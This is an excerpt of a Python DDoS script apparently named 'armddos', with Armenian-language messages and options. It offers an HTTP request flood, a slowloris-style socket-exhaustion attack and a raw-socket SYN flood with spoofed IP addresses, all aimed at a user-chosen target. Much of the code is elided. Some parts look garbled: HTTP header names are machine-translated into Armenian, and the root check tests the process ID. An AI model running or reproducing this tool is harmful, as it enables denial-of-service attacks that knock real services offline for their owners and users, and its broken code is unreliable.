...
HOPARNER
 ...
 DDos python script | Սկրիպտ, որն օգտագործվում է ddos ​​| Ddos հարձակումը
 
 Author: legion_603                                               
 Github: http://github.com/hoparner/armddos                           
 Version:'''+version+''' 
'''
...
if os.name == 'posix':
	...
	print ('[-] Ստուգեք ձեր pip տեղադրողը')
...
try:
	...
	try:
		if os.name == 'posix':
			...
			sys.exit('[+] Ես ձեզ համար անհրաժեշտ մոդուլներ եմ տեղադրել')
		elif os.name == 'nt':
			os.system('pip install colorama requests termcolor')
			sys.exit('[+] Ես ձեզ համար տեղադրել եմ անհրաժեշտ մոդուլներ')
		else:
			sys.exit('[-] Ներբեռնեք և տեղադրեք անհրաժեշտ մոդուլները')
...
def check_tgt(args):
	...
	try:
		...
		sys.exit(cprint('[-] Հնարավոր չէ \'t լուծել հյուրընկալողը: Անհայտ հաղորդավարը:','red'))
	return ip

def add_useragent():
	try:
		with open("./arm.txt","r") as fp:
			uagents = re.findall(r"(.+)\n",fp.read())
	except FileNotFoundError:
		cprint('[-] Ֆայլի անունը չկա \'arm.txt\',Չհաջողվեց բեռնել User-Agents-ը','yellow')
		return []
	return uagents
...
class Pyslow:
	...
	def mypkt(self):
		text = choice(self.method) + ' /' + str(randint(1,999999999)) + ' HTTP/1.1\r\n'+\
		      ...
		      'Բովանդակություն-Երկարություն: 42\r\n'
		pkt = buffer(text)
		return pkt
	def building_socket(self):
		try:
			...
			sys.exit(cprint('[-] Չեղարկվել է օգտագործողի կողմից','red'))
		return sock
	...
	def doconnection(self):
		...
		lsocks=[]
		lhandlers=[]
		cprint('\t\tՇինությունների վարդակներ','blue')
		while socks < (int(self.threads)):
			try:
				...
				sys.exit(cprint('[-] Չեղարկվել է օգտագործողի կողմից','red'))
		cprint('\t\tՓաթեթների ուղարկում','blue')
		while socks < int(self.threads):
			try:
...
class Requester(Thread):
	...
	def header(self):
		...
		a=choice(acceptEc)
		http_header = {
		    'Օգտատեր-Գործակալ' : choice(add_useragent()),
		    'Cache-Control' : c,
		    'Ընդունել-կոդավորում' : a,
		    'Keep-Alive' : '42',
		    'Հոստ' : self.tgt,
		    'Ուղղորդող' : choice(bot)
		}
		return http_header
	def rand_str(self):
		mystr=[]
...
def main():
	parser = ArgumentParser(
        usage='./%(prog)s -t [թիրախ] -p [պորտ] -t [number threads]',
...
'''
	...
	options.add_argument('-d',metavar='<ԻՊ|դոմեն>',default=False,help='Նշեք ձեր թիրախը նման ip կամ տիրույթի անուն')
	options.add_argument('-t',metavar='<float>',default=5.0,help='Սահմանեք վարդակի ժամանակի վերջը')
	options.add_argument('-T',metavar='<int>',default=1000,help='Միացման համար սահմանեք շղթաների համարը (կանխադրված = 1000)')
	options.add_argument('-p',metavar='<int>',default=80,help='Նշեք նավահանգստի թիրախը (կանխադրված = 80)' + colored('|Պահանջվում է միայն pyslow հարձակումով|','red'))
	options.add_argument('-s',metavar='<int>',default=100,help='Set sleep time for reconnection')
	options.add_argument('-i',metavar='<ԻՊ հասցե>',default=False,help='Նշեք կեղծ ip, եթե չօգտագործեք կեղծ ip')
	options.add_argument('-Request',action='store_true',help='Միացնել հարցման թիրախը')
	options.add_argument('-Synflood',action='store_true',help='Միացնել synflood հարձակումը')
	options.add_argument('-Pyslow',action='store_true',help='Միացնել pyslow հարձակումը')
	options.add_argument('--fakeip',action='store_true',default=False,help='Կեղծ IP-ի ստեղծման տարբերակ, եթե չնշեք կեղծ IP-ն')
	...
	if args.Synflood:
		uid = os.getpid()
		if uid == 0:
			cprint('[*] Դուք բավականաչափ թույլտվություն ունեք այս սցենարը գործարկելու համար','green')
			time.sleep(0.5)
		else:
			sys.exit(cprint('[-] Դուք բավարար \'t թույլտվություն չունեք այս սկրիպտը գործարկելու համար','red'))
		tgt=check_tgt(args)
		synsock=socket(AF_INET,SOCK_RAW,IPPROTO_TCP)
		synsock.setsockopt(IPPROTO_IP,IP_HDRINCL,1)
		ts=[]
		threads=[]
		print (colored('[*] Սկսվել է SYN Flood: ','blue')+colored(tgt,'red'))
		while 1:
			if args.i == False:
				args.fakeip = True
				if args.fakeip == True:
		...
		tgt = args.d
		threads = []
		print (colored('[*] Սկսեք ուղարկել հարցումը: ','blue')+colored(tgt,'red'))
		while 1:
			try:
	...
	if not (args.Synflood) and not (args.Request) and not (args.Pyslow):
		parser.print_help()
		print
		sys.exit(cprint('[-] Դուք պետք է ընտրեք հարձակման տեսակը','red'))
